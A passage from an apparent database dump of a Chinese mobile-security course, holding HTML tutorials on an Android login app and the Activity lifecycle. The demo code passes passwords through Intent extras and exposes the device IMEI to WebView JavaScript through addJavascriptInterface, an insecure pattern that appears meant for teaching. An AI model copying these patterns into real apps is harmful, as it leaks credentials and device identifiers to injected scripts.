</b><b>android</b><b>:layout_width=</b><b>\"wrap_content\"<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </b><b>android</b><b>:layout_height=</b><b>\"wrap_content\"<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </b><b>android</b><b>:text=</b><b>\"</b><b>密码\"<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </b><b>android</b><b>:layout_weight=</b><b>\"1\"</b>/&gt;<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;<b>EditText<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </b><b>android</b><b>:layout_width=</b><b>\"wrap_content\"<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </b><b>android</b><b>:layout_height=</b><b>\"wrap_content\"<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </b><b>android</b><b>:id=</b><b>\"@+id/password\"<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </b><b>android</b><b>:layout_weight=</b><b>\"2\"</b>/&gt;<br>\r\n<br>\r\n&nbsp;&nbsp;&nbsp; &lt;/<b>LinearLayout</b>&gt;<br>\r\n&nbsp;&nbsp;&nbsp; &lt;<b>Button<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </b><b>android</b><b>:layout_width=</b><b>\"match_parent\"<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </b><b>android</b><b>:layout_height=</b><b>\"wrap_content\"<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </b><b>android</b><b>:text=</b><b>\"</b><b>登录\"<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </b><b>android</b><b>:id=</b><b>\"@+id/login\"</b>/&gt;<br>\r\n<br>\r\n&lt;/<b>LinearLayout</b>&gt;<o:p></o:p></pre><pre>一对&lt;&gt;&lt;/&gt;代表一个子节点。这个activity_main.xml设置了两个textview和两个editview并且texview和editview的比例为1:2,一个button占用一行。<o:p></o:p></pre><pre><b>package </b>com.example.user.demo;<br>\r\n<br>\r\n<b>import </b>android.content.Intent;<br>\r\n<b>import </b>android.support.annotation.Nullable;<br>\r\n<b>import </b>android.support.v7.app.AppCompatActivity;<br>\r\n<b>import </b>android.os.Bundle;<br>\r\n<b>import </b>android.view.View;<br>\r\n<b>import </b>android.widget.Button;<br>\r\n<b>import </b>android.widget.EditText;<br>\r\n<b>import </b>android.widget.Toast;<br>\r\n<br>\r\n<b>public class </b>MainActivity <b>extends </b>AppCompatActivity {&nbsp;&nbsp;&nbsp; //所有的activity都要继承父类activity<br>\r\n&nbsp;&nbsp;&nbsp; <b>private </b>EditText <b>username</b>;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //定义私有成员EditText类型的username<br>\r\n&nbsp;&nbsp;&nbsp; <b>private </b>EditText <b>password</b>;<br>\r\n&nbsp;&nbsp;&nbsp; <b>private </b>Button <b>login</b>;<br>\r\n<br>\r\n&nbsp;&nbsp;&nbsp; @Override<br>\r\n&nbsp;&nbsp;&nbsp; <b>protected void </b>onCreate(Bundle savedInstanceState) {&nbsp;&nbsp;&nbsp; //activity必须实现的方法onCreate()<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>super</b>.onCreate(savedInstanceState);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //继承父类onCreate()<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; setContentView(R.layout.<b><i>activity_main</i></b>);&nbsp;&nbsp; //设置view绑定<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>username</b>=(EditText)findViewById(R.id.<b><i>username</i></b>);&nbsp; //绑定EditText控件ID<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>password</b>=(EditText)findViewById(R.id.<b><i>password</i></b>);<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>login</b>=(Button)findViewById(R.id.<b><i>login</i></b>);<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>login</b>.setOnClickListener(<b>new </b>View.OnClickListener() {&nbsp; //设置button的onclicklistener监听事件<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; @Override<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>public void </b>onClick(View v) {<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>if</b>(<b>username</b>.getText().toString().length()&gt;0&amp;&amp;<b>password</b>.getText().toString().length()&gt;0)<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Intent intent=<b>new </b>Intent(MainActivity.<b>this</b>,Main2Activity.<b>class</b>);&nbsp; //显式Intent调用启动Main2Activity.class<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; intent.putExtra(<b>\"username\"</b>,<b>username</b>.getText().toString());<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; intent.putExtra(<b>\"password\"</b>,<b>password</b>.getText().toString());<br>\r\n<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; startActivity(intent);<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; finish();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //结束当前activity<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>\r\n<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; });<br>\r\n<br>\r\n&nbsp;&nbsp;&nbsp; }<br>\r\n&nbsp;&nbsp;&nbsp; @Override<br>\r\n&nbsp;&nbsp;&nbsp; <b>protected void </b>onResume()&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //activity生命周期onResume()<br>\r\n&nbsp;&nbsp;&nbsp; {<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>super</b>.onResume();<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>username</b>.setText(<b>\"\"</b>);<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>password</b>.setText(<b>\"\"</b>);<br>\r\n&nbsp;&nbsp;&nbsp; }<br>\r\n}<o:p></o:p></pre><pre>这个使用到activity了，所以我们介绍下activity的生命周期。<o:p></o:p></pre><pre><o:p>&nbsp;</o:p><img src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%933.1.png\" style=\"font-family: \'Helvetica Neue\', Helvetica, Arial, sans-serif; font-size: 14px; max-width: 100%; background-color: rgb(255, 255, 255);\"></pre><p>Activity生命周期包含了7中方法：onCreate()、onStart()、onResume()、onPause()、onStop()、onRestart()、onDestroy()。即从程序的开始到程序的结束。不同于main()函数为启动入口的其他大多数编程语言，Android 系统会通过调用对应于其生命周期中特定阶段的特定回调方法在\r\nActivity 实例中启动代码。</p><p>&nbsp;</p><p>在Android官方教程中是这样介绍Android各个生命周期的执行：在Activity的生命周期中，系统会按类似于阶梯金字塔的顺序调用一组核心的生命周期方法。\r\n也就是说，Activity生命周期的每个阶段就是金字塔上的一阶。 当系统创建新Activity实例时，每个回调方法会将Activity状态向顶端移动一阶。\r\n金字塔的顶端是Activity在前台运行并且用户可以与其交互的时间点。当用户开始离开Activity时，系统会调用其他方法在金字塔中将Activity状态下移，从而销毁Activity。 在有些情况下，Activity将只在金字塔中部分下移并等待（比如，当用户切换到其他应用时），Activity可从该点开始移回顶端（如果用户返回到该Activity），并在用户停止的位置继续。</p><p>&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%933.2.png\" style=\"line-height: 1; max-width: 100%;\"></p><p><v:shape id=\"图片_x0020_2\" o:spid=\"_x0000_i1025\" type=\"#_x0000_t75\" alt=\"2209096-fdfd6b4aed4a1ade\" style=\"width:414.75pt;\r\n height:185.25pt;visibility:visible;mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image003.png\" o:title=\"2209096-fdfd6b4aed4a1ade\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image004.gif\" alt=\"2209096-fdfd6b4aed4a1ade\"></v:imagedata></v:shape></p><p>此图示显示，对于用于将Activity朝顶端的“继续”状态移动一阶的每个回调，有一种将Activity下移一阶的回调方法。 Activity还可以从“暂停”和“停止”状态回到继续状态。需要注意的是：箭头所指向的生命周期流动方向。</p><p>在Activity的生命周期中，只有三种状态是静态的，也就是说，Activity只能在三种状态之一下存在很长时间。</p><p>onResume()：在这种状态下，Activity处于前台，且用户可以与其交互。（有时也称为“运行”状态。)</p><p>onPause():在这种状态下，Activity被在前台中处于半透明状态或者未覆盖整个屏幕的另一个Activity—部分阻挡。暂停的Activity不会接收用户输入并且无法执行任何代码。</p><p>onStop():在这种状态下，Activity被完全隐藏并且对用户不可见；它被视为处于后台。停止时，Activity实例及其诸如成员变量等所有状态信息将保留，但它无法执行任何代码。其他状态（“创建”和“开始”）是瞬态，系统会通过调用下一个生命周期回调方法从这些状态快速移到下一个状态。\r\n也就是说，在系统调用 onCreate() 之后，它会快速调用\r\nonStart()，紧接着快速调用 onResume()。</p>',1,'http://oda8mr8yr.bkt.clouddn.com/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8.jpeg','index.alauda.cn/dubuqingfeng/docker-web-game:latest','2016-10-31 11:25:29',1,NULL,'<p>查看课程报告</p>',0,''),(92,'移动安全基础课程训练四','移动安全基础课程训练开发篇','<p>Android开发四</p><p>这里介绍Main2Activity了,先来看下布局文件。</p><pre><i>&lt;?</i><b>xml version=</b><b>\"1.0\" </b><b>encoding=</b><b>\"utf-8\"</b><i>?&gt;<br>\r\n</i>&lt;<b>LinearLayout </b><b>xmlns:</b><b>android</b><b>=</b><b>\"http://schemas.android.com/apk/res/android\"<br>\r\n&nbsp;&nbsp;&nbsp; </b><b>xmlns:</b><b>tools</b><b>=</b><b>\"http://schemas.android.com/tools\"<br>\r\n&nbsp;&nbsp;&nbsp; </b><b>android</b><b>:id=</b><b>\"@+id/activity_main2\"<br>\r\n&nbsp;&nbsp;&nbsp; </b><b>android</b><b>:layout_width=</b><b>\"match_parent\"<br>\r\n&nbsp;&nbsp;&nbsp; </b><b>android</b><b>:layout_height=</b><b>\"match_parent\"<br>\r\n&nbsp;&nbsp;&nbsp; </b><b>android</b><b>:orientation=</b><b>\"vertical\"<br>\r\n<br>\r\n&nbsp;&nbsp;&nbsp; </b><b>tools</b><b>:context=</b><b>\"com.example.user.demo.Main2Activity\"</b>&gt;<br>\r\n&nbsp;&nbsp;&nbsp; &lt;<b>WebView<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </b><b>android</b><b>:layout_width=</b><b>\"match_parent\"<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </b><b>android</b><b>:layout_height=</b><b>\"wrap_content\"<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </b><b>android</b><b>:id=</b><b>\"@+id/webview\"<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </b><b>android</b><b>:layout_weight=</b><b>\"10\"</b>&gt;<br>\r\n<br>\r\n&nbsp;&nbsp;&nbsp; &lt;/<b>WebView</b>&gt;<br>\r\n&nbsp;&nbsp;&nbsp; &lt;<b>Button<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </b><b>android</b><b>:layout_width=</b><b>\"match_parent\"<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </b><b>android</b><b>:layout_height=</b><b>\"wrap_content\"<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </b><b>android</b><b>:id=</b><b>\"@+id/button\"<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </b><b>android</b><b>:layout_weight=</b><b>\"1\"<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </b><b>android</b><b>:text=</b><b>\"</b><b>点击显示\"</b>/&gt;<br>\r\n<br>\r\n<br>\r\n<br>\r\n&lt;/<b>LinearLayout</b>&gt;<o:p></o:p></pre><p>&nbsp;</p><p>介绍下Main2Activity.class的代码：</p><pre><b>package </b>com.example.user.demo;<br>\r\n<br>\r\n<b>import </b>android.content.Intent;<br>\r\n<b>import </b>android.content.SharedPreferences;<br>\r\n<b>import </b>android.graphics.Bitmap;<br>\r\n<b>import </b>android.support.v7.app.AppCompatActivity;<br>\r\n<b>import </b>android.os.Bundle;<br>\r\n<b>import </b>android.telephony.TelephonyManager;<br>\r\n<b>import </b>android.util.Xml;<br>\r\n<b>import </b>android.view.View;<br>\r\n<b>import </b>android.webkit.JavascriptInterface;<br>\r\n<b>import </b>android.webkit.WebView;<br>\r\n<b>import </b>android.webkit.WebViewClient;<br>\r\n<b>import </b>android.widget.Button;<br>\r\n<b>import </b>android.widget.Toast;<br>\r\n<br>\r\n<b>import </b>java.io.File;<br>\r\n<b>import </b>java.io.FileInputStream;<br>\r\n<b>import </b>java.io.FileNotFoundException;<br>\r\n<b>import </b>java.io.FileOutputStream;<br>\r\n<br>\r\n<br>\r\n<b>public class </b>Main2Activity <b>extends </b>AppCompatActivity {<br>\r\n&nbsp;&nbsp;&nbsp; <b>private </b>String <b>username</b>;<br>\r\n&nbsp;&nbsp;&nbsp; <b>private </b>String <b>password</b>;<br>\r\n&nbsp;&nbsp;&nbsp; <b>private </b>WebView <b>webView</b>;<br>\r\n&nbsp;&nbsp;&nbsp; <b>private </b>Button <b>button</b>;<br>\r\n<br>\r\n<br>\r\n<br>\r\n&nbsp;&nbsp;&nbsp; @Override<br>\r\n&nbsp;&nbsp;&nbsp; <b>protected void </b>onCreate(Bundle savedInstanceState) {<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>super</b>.onCreate(savedInstanceState);<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; setContentView(R.layout.<b><i>activity_main2</i></b>);<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Intent intent=getIntent();<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>username</b>=intent.getStringExtra(<b>\"username\"</b>);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //接收前一个intent发来的数据。<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>password</b>=intent.getStringExtra(<b>\"password\"</b>);<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>button</b>=(Button)findViewById(R.id.<b><i>button</i></b>);<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>webView</b>=(WebView)findViewById(R.id.<b><i>webview</i></b>);<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>webView</b>.getSettings().setJavaScriptEnabled(<b>true</b>);<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>webView</b>.addJavascriptInterface(<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>new </b>Object() {<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; @JavascriptInterface<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>public </b>String imei()<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>return </b>((TelephonyManager)getSystemService(<b><i>TELEPHONY_SERVICE</i></b>)).getDeviceId();<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>\r\n<br>\r\n<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; },<b>\"android\"<br>\r\n<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </b>);<br>\r\n<br>\r\n<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>webView</b>.setWebViewClient(<b>new </b>WebViewClient());<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>final </b>String jsfile=<b>\"js.html\"</b>;<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>final </b>String js=<b>\"&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;script&gt;var imei=android.imei();document.write(imei);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\"</b>;<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>button</b>.setOnClickListener(<b>new </b>View.OnClickListener() {<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>private </b>String read(String jspath) {<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>try </b>{<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; FileInputStream fis = openFileInput(jspath);<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>byte</b>[] buffer = <b>new byte</b>[fis.available()];<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>int </b>hasread = 0;<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; StringBuilder sb = <b>new </b>StringBuilder(<b>\"\"</b>);<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>while </b>((hasread = fis.read(buffer)) &gt; 0) {<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sb.append(<b>new </b>String(buffer, 0, hasread));<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fis.close();<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>return </b>sb.toString();<br>\r\n<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } <b>catch </b>(Exception e) {<br>\r\n<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>return null</b>;<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>\r\n<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>\r\n<br>\r\n<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>private void </b>write(String jspath,String js)<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>try<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </b>{<br>\r\n<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; FileOutputStream fos=openFileOutput(jspath,<b><i>MODE_PRIVATE</i></b>);&nbsp;&nbsp;&nbsp; //创建文件模式MODE_PRIVATE私有，在/data/data/包名/<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>byte</b>[] bytes=js.getBytes();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fos.write(bytes);<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fos.close();<br>\r\n<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>catch </b>(Exception e)<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; e.printStackTrace();<br>\r\n<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>\r\n<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; @Override<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>public void </b>onClick(View v) {<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; String jstmp;<br>\r\n<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>if</b>((jstmp=<b>this</b>.read(jsfile))!=<b>null</b>)<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 